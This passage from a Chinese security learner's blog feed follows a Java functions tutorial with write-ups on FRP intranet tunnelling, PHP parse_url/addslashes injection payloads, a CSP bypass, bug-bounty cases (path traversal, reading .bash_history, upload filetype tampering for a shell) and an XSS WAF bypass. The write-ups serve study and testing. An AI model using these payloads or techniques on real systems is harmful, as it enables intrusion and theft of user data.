<p>上面代码统计数组中值等于toSearch的元素个数，如果值不等于toSearch，<strong>则跳过剩下的循环代码</strong>，执行i++。以上代码也可以不用continue，使用相反的if判断也可以得到相同的结果。</p>
<h3 id="函数">函数</h3>
<p>函数这个概念，我们学数学的时候都接触过，其基本格式是y=f(x),表示的是x到y的对应关系，给定输入x，经过函数变换f，输出y。程序中的函数概念与其类似，也由输入、操作和输出组成，但它表示的是一段子程序，这个子程序有一个名字，表示它的目的(类比f)，有零个或多个参数(类比于x)，有可能返回一个结果。下面是一个函数的例子：</p>
<pre><code class="language-java">public static int sum(int a, int b){
    int sum = a + b;
    return sum;
}
public static void print3Lines(){
    for(int i=0 ; i &lt; 3 ; i++){
        System.out.println();
    }
}
</code></pre>
<p>第一个函数名叫sum，它的目的是对输入的两个数求和。有两个输入参数，分别是int整数a和b，它的操作是对两个数求和，求和结果放在变量sum中。然后使用return语句将结果返回，最开始的public static是函数修饰符，后续介绍。</p>
<p>第二个函数名字叫print3Lines，它的目的是在屏幕上输出三个空行，它没有输入参数，操作是使用一个循环输出三个空行，它没有返回值。</p>
<p>函数的基本结构如下：</p>
<pre><code class="language-java">修饰符 返回值类型 函数名字(参数类型 参数名字, ...){
    操作;
    return 返回值;
}
</code></pre>
<ul>
<li>函数名字：名字是不可或缺的，表示函数的功能。</li>
<li>参数：参数有0个到多个，每个参数由参数的数据类型和参数名字组成。</li>
<li>操作：函数的具体操作代码。</li>
<li>返回值: 函数可以没有返回值，如果没有返回值则类型写成void,如果有则在函数代码中必须使用return语句返回一个值，这个值的类型需要和声明的返回值类型一致。</li>
<li>修饰符：暂时不介绍，后面介绍</li>
</ul>
<p>以上就是函数的语法，定义函数就是定义了一段有着明确功能的子程序，但定义函数本身不会执行任何代码，函数要被执行，需要被调用。</p>
<p>java中，任何函数都需要放在一个类中。类还没有介绍，我们暂时可以把类看作函数的一个容器。即函数放在类中，类中包含多个函数(方法)。类里面可以定义一个叫做main的方法，形式如下：</p>
<pre><code class="language-java">public static void main(String[] args){
    ...
}
</code></pre>
<p>这个函数有特殊的含义，表示程序的入口，String[] args表示从控制台接收到的参数，我们暂时可以忽略它。Java运行一个程序的时候，需要指定一个定义了main函数的类，java会寻找main函数，并从main函数开始执行。</p>
<p>关于参数传递，简单总结一下，定义函数时声明参数，无论是形参，还是返回值，实际上就是在定义变量，只是这些变量的值是未知的。调用函数时传递参数，实际上就是给函数中的变量赋值。</p>
<p>我们知道，程序执行基本只有顺序执行、条件执行和循环执行，但更完整的描述应该包括函数的调用过程。程序从main函数开始执行，碰到函数调用的时候，会跳转进函数内部，返回到main函数并且main函数没有要执行的语句后程序结束。</p>
<p>参数传递有两类特殊类型的参数：数组和可变长度的参数。</p>
<p>(1)数组</p>
<p>数组作为参数与基本类型是不一样的，基本类型不会对调用者中的变量造成任何影响，但数组不是，在函数内修改数组中的元素会修改调用者中的数组内容。我们看这个例子：</p>
<pre><code class="language-java">public static void reset(int[] arr){
    for(int i=0; i&lt;arr.length; i++){
        arr[i] = i;
    }
}

public static void main(String[] args){
    int[] arr = {10,20,30,40};
    reset(arr);
    for(int i=0; i &lt; arr.length ; i++){
        System.out.println(arr[i])
    }
}
</code></pre>
<p>在reset函数内给参数数组元素赋值，在main函数中数组arr的值也会变。</p>
<p>这个其实也容易理解，一个数组变量有两块空间，一块用于存储数组内容本身，一块用于存储内容的位置，<strong>给数组变量赋值不会影响原有的数组内容，而只会让数组变量指向一个不同的数组内容空间。</strong></p>
<p>在上例中，函数参数中的数组变量arr和main函数中的数组变量arr存储的都是相同的位置，而数组内容本身只有一份数据，所以，在reset中修改数组元素内容和在main中修改是完全一样的。</p>
<p>前面介绍的函数，参数个数都是固定的，但有时候可能希望个数不是固定的，比如求若干个数的最大值，可能是两个，也可能是多个。java支持可变长度参数如下：</p>
<pre><code class="language-java">public static int max(int min, int ... a){
    int max = min;
    for (int i=0; i&lt; a.length; i++){
        if(max&lt;a[i]){
            max = a[i];
        }
    }
    return max;
}
public static void main(String[] args){
    System.out.println(max(0));
    System.out.println(max(0,2));
    System.out.println(max(0,2,4));
    System.out.println(max(0,2,4,5));
}
</code></pre>
<p>这个max函数接受一个最小值，以及可变长度的若干参数，返回其中的最大值。可变长度参数的语法是在数据类型后面加三个点&quot;...&quot;,在函数内，可变长度参数可以看作是数组。<strong>可变长度参数必须是参数列表中的最后一个，一个函数也只能有一个可变长度的参数。</strong></p>
<p>可变长度参数实际上会转换为数组参数，也就是说，函数声明max(int min,int... a)实际上会转换为max(int min, int[] a)。</p>
<p><strong>理解返回</strong></p>
<p>return用于显式结束函数执行，返回调用方。return可以用于函数内的任意地方，可以在函数结尾，也可以在中间，可以在if语句内，可以在for循环内，用于提前结束函数执行，返回调用方。</p>
<p>函数返回值类型为void也可以使用return，即&quot;return;&quot;,不用带值，含义是返回调用方，只是没有返回值而已。</p>
<p>函数的返回值最多只能有一个，那如果实际情况需要多个返回值呢？比如，计算一个整数数组中的最大的前三个数，需要返回三个结果。这个可以用数组作为返回值，在函数内创建一个包含三个元素的数组，然后将前三个结果赋给对应的数组元素。</p>
<p>如果实际情况需要的返回值是一种复合结果呢？比如，查找一个字符数组中所有重复出现的字符以及重复出现的次数，这个可以用对象作为返回值。总之，虽然返回值最多只能有一个，但其实一个就够了。</p>
<p>每个函数都有一个名字，这个名字表示这个函数的意义。名字可以重复吗？在不同类里，答案是肯定的，在同一类里，要看情况。</p>
<p>同一个类里，函数可以重名，但是参数不能完全一样，即要么参数个数不同，要么参数个数相同但至少有一个参数类型不一样。</p>
<blockquote>
<p>我问：在java中，在同一类中的两个同名函数仅返回值类型不同，形参类型、个数都相同；这种属于符合语法规则的重载函数吗？</p>
<p>AI回答：在Java中，函数的重载（Overloading）是指在同一类中可以有多个同名的方法，但是这些方法的参数列表必须有所不同（即参数的数量、类型或顺序不同）。根据这个定义，如果两个方法仅仅是返回值类型不同，而参数列表完全相同的话，那么这并不符合Java中方法重载的规则。<br>
具体来说，方法的重载与返回类型无关，只取决于参数列表的不同。因此，如果你在同一类中有两个同名方法，它们的参数列表完全一样，只是返回类型不同，编译器会报错，因为它无法区分这两个方法，这不符合Java的方法重载语法规则。</p>
</blockquote>
<p>同一个类中函数名相同但参数不同的现象，一般称为函数重载。</p>
<p>比如，在JAVA的Math库中就定义了4个函数，如下所示：</p>
<pre><code class="language-java">public static double max(double a, double b)
public static float max(float a, float b)
public static int max(int a, int b)
public static long max(long a, long b)
</code></pre>
<p>在之前介绍函数调用的时候，我们没有特别说明参数的类型。这里说明一下，参数传递实际上是给参数赋值，调用者传递的数据需要与函数声明的参数类型是匹配的，但不要求完全一样。什么意思呢？ java编译器会自动进行类型转换，并寻找到最匹配的函数，比如：</p>
<pre><code class="language-java">char a = 'a';
char b = 'b';
System.out.println(Math.max(a,b));
</code></pre>
<p>参数是字符类型的，但Math并没有定义针对字符类型的max函数，这是因为char其实是一个整数，java会自动将char转换为int，然后调用。</p>
<p>如果Math中没有定义针对int类型的max函数呢？调用也会成功，会调用long类型的max函数。如果long也没有呢？会调用float型的max函数。如果float也没有，会调用double型的。</p>
<p><strong>递归函数</strong></p>
<p>函数大部分情况下都是被别的函数调用的，但其实函数也可以调用它自己，调用自己的函数叫递归函数。我们来看一个例子，求一个数的阶乘，数学中一个数n的阶乘，表示为n！，它的值定义是这样的：</p>
<pre><code class="language-java">0!=1
n!=(n-1)!xn
</code></pre>
<p>这个定义是一个递归的定义，为求n的值，需先求n-1的值，直到0，然后依次往回退。</p>
<pre><code class="language-java">public static long factorial(int n){
    if(n==0){
        return 1;
    }else{
        return n*factorial(n-1)
    }
}
</code></pre>
<p>看上去比较容易，和数学定义类型。递归函数形式上往往比较简单，但递归函数有开销的，而且使用不当，可能会出现意外的情况。</p>
<pre><code class="language-java">System.out.println(factorial(100000));
</code></pre>
<p>系统不会给出任何结果，而会抛出异常。</p>
<p>递归不可行的情况下怎么办呢？ 递归函数经常可以转换为非递归函数的形式，通过循环实现。比如，求阶乘的例子，其非递归形式的定义是：</p>
<pre><code class="language-java">n! = 1x2x3x4x5x6...xn
</code></pre>
<p>这个可以用循环来实现</p>
<pre><code class="language-java">public static long factorial(int n){
    long result = 1;
    for(int i=1 ; i &lt;= n ; i++){
        result =result*i;
    }
    return result;
}
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Frp内网穿透]]></title>
        <id>https://m1crofan.github.io/DGqa3C2U_/</id>
        <link href="https://m1crofan.github.io/DGqa3C2U_/">
        </link>
        <updated>2024-05-28T12:57:00.000Z</updated>
        <content type="html"><![CDATA[<p>FRP是一个好用的内网穿透工具。</p>
<p>用法</p>
<p>./frpc -c frpc.ini</p>
<p>./frps -c frps.ini</p>
<p>配置文件</p>
<p>frpc.ini</p>
<pre><code class="language-ini">[common]

  server_addr = vps_ip
  server_port = 7000
  token = 1111
  use_encryption = true
  use_compression = true

[socks5]

  type = tcp
  remote_port = 6000 #使用vps的6000端口即可访问内网资源
  plugin = socks5
</code></pre>
<p>frps.ini</p>
<pre><code class="language-ini">[common]
    bind_port = 7000
    token = 1111
</code></pre>
<p>注意事项</p>
<ul>
<li>
<p>最新版本配置文件不再是.ini 推荐使用2021年左右的版本</p>
</li>
<li>
<p>使用uname -a 查看机器的架构；对应使用wget下不同的编译版本。</p>
</li>
<li>
<p>记得给chmod +x frpc 给二进制文件可执行权限。</p>
</li>
</ul>
<p>FRP二开—forest</p>
<p>这是一个非常“哇塞”的二开工具；通过RC4算法生成frps和frpc的加密字符串。</p>
<p><a href="https://github.com/seventeenman/Forest">Forest仓库地址</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[prase_url()&addslashes()]]></title>
        <id>https://m1crofan.github.io/i7_D7XJFB/</id>
        <link href="https://m1crofan.github.io/i7_D7XJFB/">
        </link>
        <updated>2024-05-19T01:43:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="prase_url函数">prase_url函数</h3>
<p>​	我们首先来看一段代码</p>
<pre><code class="language-php">&lt;?php 
$data = parse_url($_SERVER['REQUEST_URI']); 
var_dump($data);
$filter=array(&quot;aaa&quot;,&quot;qqqq&quot;);
foreach($filter as $f)
{ 
	if(preg_match(&quot;/&quot;.$f.&quot;/i&quot;, $data['query']))
	{ 
		die(&quot;Attack Detected&quot;); 
	} 
} 

?&gt;

</code></pre>
<p>首先要明白这个函数的逻辑是啥</p>
<pre><code class="language-php">$data = parse_url($_SERVER['REQUEST_URI']);
</code></pre>
<p>这行代码使用 <code>parse_url</code> 函数解析当前请求的URL，并将结果存储在 <code>$data</code> 数组中。<code>$_SERVER['REQUEST_URI']</code> 包含了当前请求的完整URI。$_SERVER是PHP的一个超全局变量，用于存储Web服务器和运行环境创建的信息。</p>
<p><code>var_dump()</code> 是 PHP 中一个非常有用的函数，用于输出变量的详细信息，包括类型和值。它可以用于调试代码、了解变量的结构和内容，以及进行变量类型的检查。</p>
<p>正则匹配的语法</p>
<pre><code class="language-php"> &quot;/&quot;.$f.&quot;/i&quot;
</code></pre>
<ul>
<li><code>&quot;/&quot;</code>：正则表达式的起始定界符。</li>
<li><code>$f</code>：变量，表示要匹配的模式字符串。</li>
<li><code>&quot;/&quot;</code>：正则表达式的结束定界符。</li>
<li><code>i</code>：修饰符，表示不区分大小写进行匹配。</li>
</ul>
<h3 id="hack-fun">hack fun</h3>
<p>我们对上面那段代码做一个尝试</p>
<p>访问1：</p>
<pre><code class="language-url">http://www.phpstudy.com/test.php?a=1
</code></pre>
<p>返回结果：</p>
<pre><code class="language-php">array(2) { [&quot;path&quot;]=&gt; string(9) &quot;/test.php&quot; [&quot;query&quot;]=&gt; string(3) &quot;a=1&quot; }
</code></pre>
<p>访问2：构造畸形访问</p>
<pre><code class="language-url">http://www.phpstudy.com//test.php?/aaa
</code></pre>
<p>返回结果</p>
<pre><code class="language-php">array(2) { [&quot;host&quot;]=&gt; string(9) &quot;test.php?&quot; [&quot;path&quot;]=&gt; string(4) &quot;/aaa&quot; }
Notice: Undefined index: query in D:\phpstudy_pro\WWW\www.phpstudy.com\test.php on line 7

Notice: Undefined index: query in D:\phpstudy_pro\WWW\www.phpstudy.com\test.php on line 7
</code></pre>
<p>可以看到 ：parse_url()会认为 <code>test.php?</code>是host 、<code>/aaa</code>是路径</p>
<p>访问3：</p>
<pre><code class="language-url">http://www.phpstudy.com///test.php?/aaa
</code></pre>
<p>返回结果</p>
<pre><code class="language-php">bool(false)
</code></pre>
<p>其中<code>//</code>只适用于php5.4.7以前，<code>///</code>适用于php7</p>
<h3 id="addslashes">addslashes()</h3>
<p>话不多说，直接上题</p>
<pre><code class="language-php">&lt;?php
$str = addslashes($_GET['option']);
$file = file_get_contents('xxxxx/option.php');
$file = preg_replace('|\$option=\'.*\';|', &quot;\$option='$str';&quot;, $file);
file_put_contents('xxxxx/option.php', $file);
?&gt;
</code></pre>
<p>首先理解这段代码的逻辑</p>
<pre><code class="language-php">$str = addslashes($_GET['option']);
</code></pre>
<p><code>$_GET</code>老朋友了，就是获取GET参数<code>option</code></p>
<p><code>addslashes()</code>函数，这个有点眼熟；但是忘记了，搜索一番发现，这是一个转义的函数。</p>
<pre><code class="language-php">$file = file_get_contents('xxxxx/option.php');
</code></pre>
<p><code>file_get_contents()</code>函数：输入是一个路径，输出是该路径下的内容。</p>
<pre><code class="language-php">$file = preg_replace('|\$option=\'.*\';|', &quot;\$option='$str';&quot;, $file);
</code></pre>
<p><code>preg_replace()</code>函数是对文件内容进行正则表达式替换操作。它会查找文件中形如<code>$option='xxx'</code>;这样的字符串，并将其替换为<code>$option=$str</code>;</p>
<p>正则表达式: <code>|\$option=\'.*\';|</code></p>
<ul>
<li><code>|</code>: 正则表达式的定界符，可以使用任何非字母、非数字、非反斜杠的字符作为定界符号。</li>
<li><code>\$option=</code>:这部分匹配了字符串中的<code>$option=</code>。<code>$</code>在正则表达式中是特殊字符，需要使用反斜杠<code>\</code>进行转义。</li>
<li>\`:这部分匹配单引号。</li>
<li><code>.*</code> :匹配任意数量的任意字符（除了换行符）。<code>.</code>表示匹配任意单个字符，<code>*</code> 表示匹配前面的字符零次或多次。</li>
</ul>
<pre><code class="language-php">file_put_contents('xxxxx/option.php', $file);
</code></pre>
<p>最后一行使用 <code>file_put_contents()</code>函数将修改后的文件内容写回到名为<code>option.php</code>的文件中，完成对文件的更新操作。</p>
<h3 id="hack-fun-2">hack fun</h3>
<h4 id="方法1">方法1</h4>
<p>这个漏洞触发逻辑用一句话概括就是：逃离数据域，到达代码逻辑域。</p>
<p>由于正则匹配会匹配除换行符以外的字符；并且<code>addslashes()</code>也不会转义换行符<code>%0a</code></p>
<p>第一次payload</p>
<pre><code class="language-php">?option=abc';phpinfo();%0a//
</code></pre>
<p>此时option.php中的内容为</p>
<pre><code class="language-php">&lt;?php
	$option = 'aaa\';phpinfo();
	//';
?&gt;
</code></pre>
<p>第二次随便传入什么</p>
<pre><code class="language-php">?option=def
</code></pre>
<p>此时option.php中的内容为：</p>
<pre><code class="language-php">&lt;?php
	$option = 'def';phpinfo();
	//';
?&gt;
</code></pre>
<p>正则匹配直接把转义符也替换掉了🤣</p>
<h4 id="方法二">方法二</h4>
<p>payload</p>
<pre><code class="language-url">option=;&amp;option=%5c%27;phpinfo();//
</code></pre>
<p><code>%5c</code> 是反斜杠的html编码</p>
<p><code>addslashes()</code>只能转换单引号；而不转换反斜杠 ；所以能成功。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[baby_csp]]></title>
        <id>https://m1crofan.github.io/7T26boCLX/</id>
        <link href="https://m1crofan.github.io/7T26boCLX/">
        </link>
        <updated>2024-05-14T08:31:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>在p牛的知识星球看到一个php的帖子，最近几年安全研究员都仅跟潮流研究java安全。php还是很少见，这引起了我的好奇。</p>
<h3 id="环境">环境</h3>
<p>Dockerfile</p>
<pre><code>FROM php:apache
COPY index.php /var/www/html
</code></pre>
<p>index.php</p>
<pre><code class="language-php">&lt;?php
header(&quot;Content-Security-Policy:default-src 'none';&quot;);
if(isset($_GET[&quot;xss&quot;])) echo $_GET[&quot;XSS&quot;];
?&gt;
</code></pre>
<p>根据Dockerfile创建镜像</p>
<ul>
<li>
<p>在含有Dockerfile的文件下运行这条命令</p>
</li>
<li>
<p>虚拟机最好是要挂代理，下载会很快</p>
</li>
</ul>
<pre><code class="language-shell">docker build -t myphpxss .
</code></pre>
<p>根据镜像创建docker容器</p>
<ul>
<li>踩坑点：这条命令是指把容器的80端口映射给本机8080端口。此处，容器的端口一定要是80，本机端口无所谓。</li>
</ul>
<pre><code class="language-shell">docker run -d -p 8080:80 myphpxss
</code></pre>
<h3 id="hackfun">hackfun</h3>
<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/m1crofan/image/main/image-20240514161104324.png" alt="image-20240514161104324" loading="lazy"></figure>
<p>P牛给的原理：</p>
<p>PHP继承了CGI的特性，输出就等于写入HTTP response，<strong>一旦开始写入response，就无法再设置header</strong>。在这道题目里，echo在header()后面执行，所以正常来讲header()执行不会遇到问题。 但这里可以使用到一个trick：默认情况下max_input_vars的值是1000，也就是PHP最多接受1000个参数。一旦超过这个数量，PHP就会出错并产生一个Warning。Docker PHP环境默认的error_reporting是空，即为E_ALL &amp; ~E_NOTICE &amp; ~E_STRICT &amp; ~E_DEPRECATED，会显示除了E_NOTICE、E_STRICT、E_DEPRECATED以外的所有错误信息。 由于参数解析过程发生在脚本执行以前，<strong>错误信息写入response会导致header()函数执行出错，最终CSP头无法输出</strong>，XSS成功执行。 我记得之前CTF也出现过类似的考点，但这道题确实体现了“浓缩就是精华”的道理。 通常情况下，为了解决错误信息输出导致header()函数执行失败的问题，我们可以给output_buffering选项设置一个值，比如4096。当output_buffering大于0时，输出数据则会先存放于对应大小的缓冲区中，只有输出的内容大于缓冲区大小时，response才会实际写入。由于Docker默认PHP环境的output_buffering等于0，没有任何缓冲区，这也是这个CTF能够实现的必要条件。</p>
<p>P牛还问了一个问题：</p>
<p>​	除了1000个参数以外，你还能找到哪些方法在脚本执行前触发错误并输出错误信息？</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[SRC挖掘案例]]></title>
        <id>https://m1crofan.github.io/HeZFM969Z/</id>
        <link href="https://m1crofan.github.io/HeZFM969Z/">
        </link>
        <updated>2024-04-25T13:29:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="服务器文件读取">服务器文件读取</h3>
<p>漏洞功能点在首页的Logo展示处，只有首次打开此APP时，才会远程下载此图片。加载图片的GET请求包如下：</p>
<pre><code class="language-http">GET /ixxx/LogonImage.do?ImageDir=/img/2024/4/25&amp;SaveImageName=microfan.jpg HTTP/1.1
Host xxxx.com
</code></pre>
<p>第一个尝试：空文件名测试当空文件名时，是否会列出目录结构。</p>
<p>第二个尝试：路径的目录穿越，payload如下</p>
<pre><code class="language-http">GET /ixxx/LogonImage.do?ImageDir=/img/2024/4/25/../../../../../etc/&amp;SaveImageName=passwd HTTP/1.1
Host xxxx.com
</code></pre>
<p>测试结果是：被waf拦截。</p>
<blockquote>
<p>提一嘴，这种情况下一般我就放弃了（汗流浃背）。</p>
</blockquote>
<p>测试发现waf拦截特征：<code>../</code></p>
<p>柳暗花明又一村</p>
<pre><code class="language-http">GET /ixxx/LogonImage.do?ImageDir=/&amp;SaveImageName=.bash_history HTTP/1.1
Host xxxx.com
</code></pre>
<p>读取根目录下的.bash_history;通过读取这个文件，读取到了一些敏感的文件。</p>
<blockquote>
<p>ChatGPT:</p>
<p>.bash_history是一个用于存储用户在Bash shell中执行的命令历史记录的文件。每当用户在Bash shell中输入并执行一个命令时，该命令都会被添加到.bash_history文件中。这样，用户就可以方便地查看和重复之前执行过的命令，提高工作效率。</p>
<p>.bash_history文件通常位于用户的home目录下。在大多数情况下，它的完整路径是/home/用户名/.bash_history，其中“用户名”是你的用户账户的名称。你可以使用ls命令来查看该文件是否存在，或者使用cat、less等命令来查看其内容。</p>
</blockquote>
<p>敏感文件的文件名结构：/Nxxxxx/xxFile/xx_20240425_51xxx.txt</p>
<p>看文件名结构可知：文件名是由时间戳+ID顺序编号组成的，我们可以轻松遍历全部敏感信息🤭。</p>
<h4 id="总结">总结</h4>
<p>通过读取Linux系统的bash_history文件，通过管理员的输入命令记录获取目录结构，从而进一步读取其他敏感文件扩大危害。</p>
<h3 id=""></h3>
<h3 id="信息泄露getshell">信息泄露+Getshell</h3>
<p><strong>信息泄露</strong></p>
<p>使用bp对注册页面register.do功能页面，爆破.do的功能路径；爆破出一个http://xxx/user.do路径泄露全部的用户信息，包括姓名、手机号、密码哈希、用户上传文件等信息。</p>
<p><strong>上传</strong></p>
<p>上传文件功能的数据包URL如下：</p>
<pre><code class="language-http">POST /fileUpload.do?maxsize=1024&amp;path=test&amp;uploader&amp;filetype=.doc,.txt,.docx,.jpg,.png HTTP/1.1
HOST: xxx.xxx.xx.xx
</code></pre>
<p>这个非常熟悉，实习时候也碰到过一样的情况，只需要将filetype添加一个jsp 或 jspx 就可以。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[xss绕waf的小trick]]></title>
        <id>https://m1crofan.github.io/2OHQ0OA1V/</id>
        <link href="https://m1crofan.github.io/2OHQ0OA1V/">
        </link>
        <updated>2024-03-23T08:36:14.000Z</updated>
        <content type="html"><![CDATA[<p><strong>0x00</strong></p>
<p>在翻某SRC的js文件的时候，发现了GET参数可控；情况大致如下</p>
<pre><code class="language-javascript">&lt;script&gt;
...
    const order = 'microfan2'
	const type = 'microfan1'
...
&lt;/script&gt;
</code></pre>
<p>经过测试发现网站存在WAF，以及后端会对传入的<code>&lt;&gt;</code> <code>&quot;&quot;</code>做HTML编码；但并不会对<code>'</code>、<code>()</code>做编码处理。此处的数据域在<code>&lt;script&gt;</code>标签内，感觉有戏。</p>
<p>0x01</p>
<p>xss本质属于注入漏洞；因此围绕着的核心思想就是：逃出数据域，进入逻辑域。</p>
<p>经过多次尝试发现，虽然WAF并不会对<code>（）</code>、<code>''</code>做编码处理;但是会对其做匹配检测。如果一段payload中存在闭合的<code>()</code>则会对其进行拦截;而<code>)(</code>却不会拦截</p>
<p>0x02</p>
<p>成功的payload</p>
<pre><code class="language-url">/index.php?type=*/1);%27&amp;order=%27;alert(1/*
</code></pre>
<p>response</p>
<pre><code class="language-javascript">&lt;script&gt;	
	const gift_order = '';
	alert(1/*'
	const gift_type = '*/);''
&lt;/script&gt;
</code></pre>
<p>其中的关键点在于：使用多行注释、分号、单引号等使得逃离数据域成功执行弹窗~。分号的作用是让JavaScript解释器能够识别独立的语句。</p>
<p>最后成功弹窗</p>
<p><image url="https://raw.githubusercontent.com/m1crofan/image/main/image-20240323161048044.png"></image></p>
<p>由于重重限制，最终也就仅能弹个窗；不能进行下一步有效的利用；但是绕waf的过程还是很有意思的~</p>
]]></content>
    </entry>
</feed>